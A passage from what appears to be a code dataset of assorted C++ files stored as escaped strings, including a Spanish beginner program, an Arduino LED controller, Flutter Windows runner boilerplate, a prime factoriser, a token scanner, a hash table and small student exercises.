Contrasena;\n\t\t\t\tcout << endl;\n\t\t\t\t\n\t\t\t\tcout << \"Felicidades Ya Estas Registrado. Puedes navegar\" << endl;\n\t\t\t\tcout << \"\u00bfQuieres Agregar Amigos?\" << endl;\n\t\t\t\tcin >> QuieresNavegarEnRedes;\n\t\t\t\tif (    QuieresNavegarEnRedes)\n\t\t\t\t{\n\t\t\t\t\tcout << \"Busca a algun amigo\" << endl;\n\t\t\t\t\tcout << \"ingresa su nombre\" << endl;\n\t\t\t\t\tcin >> Amigos;\n\t\t\t\t\tcout << \"Agregaste a \" << Amigos << endl;\n\t\t\t\t\tcout << \"Puedes seguir navegando\"<< endl;\n\t\t\t\t\tcout << \"\u00bfte gustaria poner foto de perfil?\" << endl;\n\t\t\t\t\tcin >> FotoDePerfil;\n\t\t\t\t\tif (FotoDePerfil)\n\t\t\t\t\t{\n\t\t\t\t\t\tcout << \"ingresar a perfil\" << endl;\n\t\t\t\t\t\tcout << \"ingresa a donde dice foto\" << endl;\n\t\t\t\t\t\tcin >> foto;\n\t\t\t\t\t\tcout << \"Agregaste foto \" << foto << endl;\n\t\t\t\t\t\tcout << \"foto subida\";\n\t\t\t\t\t}else\n\t\t\t\t\t{\n\t\t\t\t\t\tcout << \"foto no subida\" << endl;\n\t\t\t\t\t}\n\t\t\t\t}else\n\t\t\t\t{\n\t\t\t\t\tcout << \"Puedes seguir navegando\" << endl;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t\t}\n\t\t\t\n\t\t}else\n\t\t{\n\t\t\tcout << \"Losiento No tengo esa red Social\" << endl;\n\t\t}\n\t\t\n\t\t\n\t}else{\n\t\tcout << \"Ok, Sigue haciendo lo que estas haciendo\" << endl;\n\t}\n\treturn 0;\n}\n",
    "/* ========================================\n *\n *  loopian: white led\n *    description: white led\n *    for Arduino Leonardo / Sparkfun pro micro\n *\n *  Copyright(c)2023- Masahiko Hasebe at Kigakudoh\n *  This software is released under the MIT License, see LICENSE.txt\n *\n * ========================================\n */\n#include \"white_led.h\"\n#include \"i2cdevice.h\"\n\n/*----------------------------------------------------------------------------*/\n//     White LED Control\n/*----------------------------------------------------------------------------*/\nvoid WhiteLed::clear_all(void)\n{\n  for (int j=0; j<MAX_KAMABOKO_NUM; j++){\n    for (int i=0; i<MAX_EACH_LIGHT; i++){\n      light_led_each(i, j, 0);\n    }\n  }\n}\nint WhiteLed::gen_lighting_in_loop(long difftm, int (&tchev)[MAX_TOUCH_EV])\n{\n  _total_time += difftm;\n  _fade_counter += difftm;\n  if (_fade_counter > FADE_RATE){_fade_counter = 0;}\n\n  //for (int x=0; x<MAX_EACH_LIGHT*MAX_KAMABOKO_NUM; x++){_light_lvl[x]=0;}\n  // 0\u30af\u30ea\u30a2\n  memset(&_light_lvl[0], 0, sizeof(int)*MAX_EACH_LIGHT*MAX_KAMABOKO_NUM);\n\n  // tchev : 0-1599 + 1600*kamanum \u3067\u7d76\u5bfe\u4f4d\u7f6e\u304c\u8868\u73fe\u3055\u308c\u3001\u30a4\u30d9\u30f3\u30c8\u3054\u3068\u306b\u305d\u306e\u6570\u5024\u304c\u5165\u529b\u3055\u308c\u308b\n  int max_ev = 0;\n  constexpr int MAKE_FRAC = MAX_LOCATE / (MAX_EACH_LIGHT*MAX_KAMABOKO_NUM);\n  for (int i=0; i<MAX_TOUCH_EV; i++){\n    if (tchev[i] == -1){break;}\n    int frac = tchev[i]%MAKE_FRAC;\n    int pos = tchev[i]/MAKE_FRAC;\n    for (int j=0; j<2; j++){\n      //  \u89e6\u3063\u305f\u7b87\u6240\u306e\u524d\u5f8c\u4e8c\u3064\u306eLED\u304c\u70b9\u706f\u3059\u308b\n      _light_lvl[pos+1+j] += (frac+100)>j*100? (frac+100)-j*100: 0;    // 199 - 0\n      if (pos>=j){\n        _light_lvl[pos-j] += (199-frac)>j*100? (199-frac)-j*100: 0;\n      }\n    }\n    max_ev += 1;\n  }\n\n  for (int j=0; j<MAX_KAMABOKO_NUM; j++){one_kamaboco(j);}\n  if (_fade_counter == 0){_fade_counter = 1;}\n\n  return max_ev;\n}\nvoid WhiteLed::one_kamaboco(int kamanum)\n{\n  uint16_t time = static_cast<uint16_t>(_total_time/5);\n  const int offset_num = kamanum*MAX_EACH_LIGHT;\n\n  for (int i=0; i<MAX_EACH_LIGHT; i++){\n    int x = i+offset_num;\n    if ((_light_lvl[x] > 0) || (_light_lvl_itp[x] > 0)){\n      if (_light_lvl[x]>_light_lvl_itp[x]){_light_lvl_itp[x] = _light_lvl[x];}\n      else if (_fade_counter == 0){\n        // \u3060\u3093\u3060\u3093\u6697\u304f\u306a\u308b\u3068\u304d\n        _light_lvl_itp[x] = (_light_lvl_itp[x]-_light_lvl[x])*3/4 + _light_lvl[x];\n      }\n      light_led_each(i, kamanum, _light_lvl_itp[x]*20);\n    }\n    else {\n      // \u80cc\u666f\u3067\u8584\u304f\u5149\u3063\u3066\u3044\u308b\n      int ptn = (time+(4*i))%64;\n      ptn = ptn<32? ptn:64-ptn;\n      light_led_each(i, kamanum, ptn);\n    }\n  }\n  //pca9544_changeI2cBus(1,kamanum); // \u5225\u306eI2C\u30d0\u30b9\u306b\u5909\u3048\u306a\u3044\u3068\u3001\u4ed6\u306ekamanum\u306e\u3068\u304d\u306b\u4e0a\u66f8\u304d\u3055\u308c\u3066\u3057\u307e\u3046\n}\nvoid WhiteLed::light_led_each(const int num, const int dev_num, uint16_t strength){ // strength=0-4095\n  int err;\n  uint8_t adrs = num * 4 + 0x06;\n  if (strength > 4000){strength = 4000;}\n\terr = PCA9685_write( dev_num+16, adrs, 0 );          // ON\u306ftime=0\n\terr = PCA9685_write( dev_num+16, adrs+1, 0 );        // ON\u306ftime=0\n\terr = PCA9685_write( dev_num+16, adrs+2, (uint8_t)(strength & 0x00ff) );// OFF 0-4095 (0-0x0fff) \u306e\u4e0b\u4f4d8bit\n\terr = PCA9685_write( dev_num+16, adrs+3, (uint8_t)(strength>>8) );      // OFF \u4e0a\u4f4d4bit\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_estudios_calidad\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculadora\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <random>\n#include <boost/multiprecision/cpp_int.hpp>\n#include <boost/random.hpp>\n\nusing namespace boost::multiprecision;\n\nconst int MILLERRABINITERATIONS = 40;\n\ncpp_int powMod(cpp_int base, cpp_int exp, const cpp_int& mod) {\n    cpp_int result = 1;\n    base %= mod;\n    while (exp > 0) {\n        if (exp & 1) {\n            result = (result * base) % mod;\n        }\n        base = (base * base) % mod;\n        exp >>= 1;\n    }\n    return result;\n}\n\nbool millerRabinTest(const cpp_int& n) {\n    if (n <= 1 || n == 4) return false;\n    if (n <= 3) return true;\n\n    cpp_int d = n - 1;\n    while ((d & 1) == 0) {\n        d >>= 1;\n    }\n\n    boost::random::mt19937_64 rng(std::random_device{}());\n    for (int i = 0; i < MILLERRABINITERATIONS; i++) {\n        cpp_int a = boost::random::uniform_int_distribution<cpp_int>(2, n - 2)(rng);\n        cpp_int x = powMod(a, d, n);\n        if (x == 1 || x == n - 1) continue;\n\n        bool isPrime = false;\n        for (cpp_int r = 1; r < d; r *= 2) {\n            x = powMod(x, 2, n);\n            if (x == 1) return false;\n            if (x == n - 1) {\n                isPrime = true;\n                break;\n            }\n        }\n\n        if (!isPrime) return false;\n    }\n\n    return true;\n}\n\nvoid printFactors(cpp_int n, bool isRoot = true) {\n    cpp_int factor = 2;\n    bool firstFactor = true;\n    while (n > 1 && factor * factor <= n) {\n        int exp = 0;\n        while (n % factor == 0) {\n            ++exp;\n            n /= factor;\n        }\n        if (exp > 0) {\n            if (!firstFactor) std::cout << \" * \";\n            firstFactor = false;\n            \n            std::cout << factor;\n            if (exp > 1) {\n                std::cout << \"^\";\n                if (!millerRabinTest(exp)) { // exp is composite\n                    std::cout << \"(\";\n                    printFactors(exp, false); // Recursive call for exponent factorization\n                    std::cout << \")\";\n                } else {\n                    std::cout << exp; // exp is prime\n                }\n            }\n            std::cout.flush(); // Ensure the output is printed immediately\n        }\n        factor = (factor == 2) ? cpp_int(3) : factor + 2;\n    }\n    if (n > 1) {\n        if (!firstFactor) std::cout << \" * \";\n        std::cout << n;\n        std::cout.flush();\n    }\n}\n\nvoid primeFactorization(cpp_int n) {\n    if (n <= 1) {\n        std::cout << \"No prime factorization for \" << n << std::endl;\n        return;\n    }\n\n    if (millerRabinTest(n)) {\n        std::cout << n << \" = \" << n << \" (prime)\" << std::endl;\n        return;\n    }\n\n    std::cout << n << \" = \";\n    printFactors(n);\n    std::cout << std::endl;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <positive integer greater than 1>\" << std::endl;\n        return 1;\n    }\n\n    cpp_int number;\n    try {\n        number = cpp_int(argv[1]);\n    } catch (const std::exception& e) {\n        std::cerr << \"Error: Invalid input: \" << e.what() << std::endl;\n        return 1;\n    }\n\n    if (number < 2) {\n        std::cerr << \"Usage: \" << argv[0] << \"< positive integer greater than 1>\" << std::endl;\n        return 1;\n    }\n\n    primeFactorization(number);\n\n    return 0;\n}\n\n",
    "#include <iostream>\n#include <string>\n#include <string_view>\n#include <variant>\n#include <vector>\n\nstruct Token {\n    enum class Type {\n        LeftParen, RightParen, LeftBrace, RightBrace,\n        Comma, Dot, Minus, Plus, Semicolon, Slash, Star,\n\n        Bang, BangEqual,\n        Equal, EqualEqual,\n        Greater, GreaterEqual,\n        Less, LessEqual,\n\n        Identifier, String, Number,\n\n        And, Class, Else, False, Fun, For, If, Nil, Or,\n        Print, Return, Super, This, True, Var, While,\n    };\n\n    using Literal = std::variant<std::monostate, double, std::string_view>;\n\n    Type m_type;\n    std::string_view m_lexeme;\n    Literal m_literal;\n\n    Token(Type type, std::string_view lexeme)\n        : m_type(type)\n        , m_lexeme(lexeme)\n    {}\n};\n\nclass Scanner {\npublic:\n    Scanner(std::string_view source);\n    std::vector<Token> scan();\n\nprivate:\n    std::string_view m_source;\n};\n\nScanner(std::string_view source) : m_source(source)\n{}\n\nstd::vector<Token> Scanner::scan()\n{\n    std::vector<Token> tokens;\n    while (!m_source.empty()) {\n        switch (m_source[0]) {\n        case '(':\n            tokens.push_back(Token{Token::Type::LeftParen, m_source.substr(0, 1)});\n            break;\n        case ')':\n            tokens.push_back(Token{Token::Type::RightParen, m_source.substr(0, 1)});\n            break;\n        case '{':\n            tokens.push_back(Token{Token::Type::LeftBrace, m_source.substr(0, 1)});\n            break;\n        case '}':\n            tokens.push_back(Token{Token::Type::RightBrace, m_source.substr(0, 1)});\n            break;\n        case ',':\n            tokens.push_back(Token{Token::Type::Comma, m_source.substr(0, 1)});\n            break;\n        case '.':\n            tokens.push_back(Token{Token::Type::Dot, m_source.substr(0, 1)});\n            break;\n        case '-':\n            tokens.push_back(Token{Token::Type::Minus, m_source.substr(0, 1)});\n            break;\n        case '+':\n            tokens.push_back(Token{Token::Type::Plus, m_source.substr(0, 1)});\n            break;\n        case ';':\n            tokens.push_back(Token{Token::Type::Semicolon, m_source.substr(0, 1)});\n            break;\n        case '*':\n            tokens.push_back(Token{Token::Type::Star, m_source.substr(0, 1)});\n            break;\n        default:\n            m_source.remove_prefix(1);\n        }\n    }\n    return tokens;\n}\n\nint main()\n{\n    return 0;\n}\n",
    "#include<iostream>\nusing namespace std;\n\nclass ClosedHashTable{\n    public:\n\n        pair<string, int>* arr;\n        int filled;\n        int loadfactor;\n        int table_size;\n\n    ClosedHashTable(){\n        filled = 0;\n        loadfactor = 0;\n        table_size = 37;\n        arr = new pair<string, int>[37];\n    }\n\n    float load(){\n        return filled/table_size;\n    }\n\n\tint hash(string key){\n\t\tint index = 0;\n\t\tfor(char x : key){\n\t\t\tindex += (int(x)*int(x)*32 + 11)%table_size;\n\t\t\t\n\t\t}\n\t\treturn index%table_size;\t\n\t}\n\tbool is_prime(int val){\n\t\tfor (int i = 2; i < val/2; i++){\n\t\t\tif (val%i == 0){\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tint next_prime(int val){\n\t\tint i = table_size;\n\t\ti *= 2;\n\t\t\n\t\twhile(true){\n\t\t\tif(is_prime(i)){\n\t\t\t\treturn i;\n\t\t\t}\n\t\t\telse{\n\t\t\t\ti++;\n\t\t\t}\n\t\t}\n\t}\n\tvoid insert(string key, string select){\n\t\tint index = hash(key);  \n\t\tif(arr[index].first.empty()){\n            arr[index].first = key;\n            arr[index].second = 1;\n\t\t\tfilled++;\n\t\t}\n\t\telse if(arr[index].first == key){\n\t\t\tarr[index].second++; \n\t\t}\n\t\telse{\n\t\t\t\n\t\t\t// linear probe to another index\n\t\t\tif (select == \"linear\"){\n\t\t\t\tint i = index+1;\n\t\t\t\twhile(i%table_size != index){\n\t\t\t\t\ti = i%table_size;\n\t\t\t\t\tif(arr[i].first.empty()){\n\t\t\t\t\t\tarr[i].first = key;\n\t\t\t\t\t\tarr[i].second = 1;\n\t\t\t\t\t\tfilled++;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\telse if(arr[i].first == key){\n\t\t\t\t\t\tarr[i].second++; \n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\ti++;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (select == \"quadratic\"){\n\t\t\t\tint i = index;\n\t\t\t\tfor (int j = 0; j < table_size; j++){\n\t\t\t\t\ti = (index + j*j)%table_size;\n\t\t\t\t\tif(arr[i].first.empty()){\n\t\t\t\t\t\tarr[i].first = key;\n\t\t\t\t\t\tarr[i].second = 1;\n\t\t\t\t\t\tfilled++;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\telse if(arr[i].first == key){\n\t\t\t\t\t\tarr[i].second++; \n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n        return;\n\t}\n\tint get(string key){\n\t\tint index = hash(key);\n\t\tif (arr[index].first == key){\n\t\t\treturn arr[index].second;\n\t\t}\n\t\telse if (!arr[index].first.empty() && arr[index].first != key){\n\t\t\t//linear prbe \n\t\t\tint i = index + 1;\n\t\t\twhile(i%table_size != index){\n\t\t\t\ti = i%table_size;\n\t\t\t\tif (!arr[i].first.empty() && arr[i].first == key){\n\t\t\t\n\t\t\t\t\treturn arr[i].second; \n\t\t\t\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\ti++;\n\t\t\t\t}\n\t\t\t}\n            //if did not find anythinf then return 0.\n\t\t}\n\t\treturn 0;\n\t}\n};\n\nint main(){\n\n    ClosedHashTable h;\n    h.insert(\"cha\", \"quadratic\");\n    h.insert(\"cha\", \"quadratic\");\n    cout << h.get(\"cha\");\n}\n",
    "#include <iostream>\r\n#include <cmath>\r\n\r\nstruct LiczbaGausa {\r\n\tint real;\r\n\tint imaginary;\r\n};\r\n\r\nint norma (LiczbaGausa& l){\r\n\treturn (l.real * l.real) + (l.imaginary * l.imaginary);\r\n}\r\n\r\n//\tx = q * y + r  => r = x - q * y\r\n\r\nLiczbaGausa dzielnik(LiczbaGausa& x, LiczbaGausa& y){\r\n\tLiczbaGausa q;\r\n\tif(y.real == 0 && y.imaginary == 0){\r\n\t\tstd::cout << \"Nie mo\u017cna podzieli\u0107 przez 0\" << std::endl;\r\n\t} else{\r\n\t\tq.real = (x.real * y.real + x.imaginary * y.imaginary) / norma(y);\r\n\t\tq.imaginary = (x.imaginary * y.real - x.real * y.imaginary) / norma(y);\r\n\t}\r\n\t\r\n\treturn q;\r\n}\r\n\r\nLiczbaGausa reszta(LiczbaGausa& x, LiczbaGausa& y){\r\n\tLiczbaGausa q = dzielnik(x, y);\r\n\tLiczbaGausa r;\r\n\tr.real = x.real - q.real * y.real + q.imaginary * y.imaginary;\r\n\tr.imaginary = x.imaginary - q.real * y.imaginary - q.imaginary * y.real;\r\n\r\n\treturn r;\r\n}\r\n\r\nint main(){\r\n\tLiczbaGausa x = {3, 4};\r\n\tLiczbaGausa y = {1, 3};\r\n\r\n\tLiczbaGausa q, r;\r\n\r\n\tq = dzielnik(x, y);\r\n\tr = reszta(x, y);\r\n\r\n\tstd::cout << \"q: \" << q.real << \" + \" << q.imaginary << \"i\" << std::endl;\r\n\tstd::cout << \"r: \" << r.real << \" + \" << r.imaginary << \"i\" << std::endl;\r\n\r\n\treturn 0;\r\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <glm/ext/quaternion_transform.hpp>\n#include <glm/ext/quaternion_float.hpp>\n#include <glm/ext/vector_relational.hpp>\n#include <glm/ext/scalar_constants.hpp>\n\n#define GLM_ENABLE_EXPERIMENTAL\n#include <glm/gtx/quaternion.hpp>\n\nstatic int test_lookAt()\n{\n\tint Error(0);\n\n\tglm::vec3 eye(0.0f);\n\tglm::vec3 center(1.1f, -2.0f, 3.1416f);\n\tglm::vec3 up(-0.17f, 7.23f, -1.744f);\n\n\tglm::quat test_quat = glm::quatLookAt(glm::normalize(center - eye), up);\n\tglm::quat test_mat = glm::conjugate(glm::quat_cast(glm::lookAt(eye, center, up)));\n\n\tError += static_cast<int>(glm::abs(glm::length(test_quat) - 1.0f) > glm::epsilon<float>());\n\tError += static_cast<int>(glm::min(glm::length(test_quat + (-test_mat)), glm::length(test_quat + test_mat)) > glm::epsilon<float>());\n\n\t// Test left-handed implementation\n\tglm::quat test_quatLH = glm::quatLookAtLH(glm::normalize(center - eye), up);\n\tglm::quat test_matLH = glm::conjugate(glm::quat_cast(glm::lookAtLH(eye, center, up)));\n\tError += static_cast<int>(glm::abs(glm::length(test_quatLH) - 1.0f) > glm::epsilon<float>());\n\tError += static_cast<int>(glm::min(glm::length(test_quatLH - test_matLH), glm::length(test_quatLH + test_matLH)) > glm::epsilon<float>());\n \n\t// Test right-handed implementation\n\tglm::quat test_quatRH = glm::quatLookAtRH(glm::normalize(center - eye), up);\n\tglm::quat test_matRH = glm::conjugate(glm::quat_cast(glm::lookAtRH(eye, center, up)));\n\tError += static_cast<int>(glm::abs(glm::length(test_quatRH) - 1.0f) > glm::epsilon<float>());\n\tError += static_cast<int>(glm::min(glm::length(test_quatRH - test_matRH), glm::length(test_quatRH + test_matRH)) > glm::epsilon<float>());\n\n\treturn Error;\n}\n\nint main()\n{\n\tint Error = 0;\n\n\tError += test_lookAt();\n\n\treturn Error;\n}\n",
    "#include<iostream>\nusing namespace std;\n\nclass Node {\npublic:\n    int data;\n    Node* next;\n\n    Node() {\n        this->data = 0;\n        this->next = NULL;\n    }\n    Node(int data) {\n        this->data = data;\n        this->next = NULL;\n    }\n};\n\nvoid prints(Node* head) {\n    Node* temp = head;\n    while(temp != NULL) {\n        cout << temp->data << \" \";\n        temp = temp->next;\n    } \n}\n\nvoid insertathead(Node* &head, Node* &tail, int data) {\n    if(head == NULL) {\n        Node* newnode = new Node(data);\n        head = newnode;\n        tail = newnode;\n        return;\n    }\n    Node* newnode = new Node(data);\n    newnode->next = head;\n    head = newnode;\n}\n\nNode* getmiddle(Node* head) {\n    if(head == NULL)\n        return NULL;\n    Node* slow = head;\n    Node* fast = head;\n    while(fast != NULL && fast->next != NULL) {\n        slow = slow->next;\n        fast = fast->next->next;\n    }\n    return slow;\n}\n\nint main() {\n    Node* head = NULL;\n    Node* tail = NULL;\n    // Insertion in linked list\n    insertathead(head, tail, 50);\n    insertathead(head, tail, 20);\n    insertathead(head, tail, 30);\n    insertathead(head, tail, 40);\n\n    prints(head);\n    cout << \"\\nThe middle node is: \";\n    Node* middle = getmiddle(head);\n    if(middle != NULL)\n        cout << middle->data;\n    else\n        cout << \"List is empty or has only one node.\";\n    return 0;\n}\n",
